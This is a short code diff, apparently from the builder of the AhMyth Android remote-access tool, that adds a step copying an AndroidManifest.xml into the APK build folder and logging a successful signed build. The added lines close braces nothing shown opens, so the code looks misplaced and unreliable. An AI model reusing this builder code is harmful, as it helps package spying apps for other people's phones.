@@ -78,3 +78,19 @@ fs.writeFile(launcherPath, output, 'utf8', (error) => {
         $appCtrl.Log('Modifying launcher activity Failed', logStatus.FAIL);
         return;
     }
+    
+// manifest replacement function | AppCtrl.js = Line 2849 --> 2860 |
+// ============================= | =============================== |
+    
+                            fs.copyFile(path.join(CONSTANTS.vaultFolderPath, "AndroidManifest.xml"), path.join(CONSTANTS.ahmythApkFolderPath, "AndroidManifest.xml"), (err) => {
+                              if (err) throw err;
+                            
+                              $appCtrl.Log('Apk built successfully', CONSTANTS.logStatus.SUCCESS);
+                              $appCtrl.Log("The apk has been built on " + path.join(outputPath, CONSTANTS.signedApkName), CONSTANTS.logStatus.SUCCESS);                        
+
+                            });
+                          });
+                    });
+            });
+
+    }
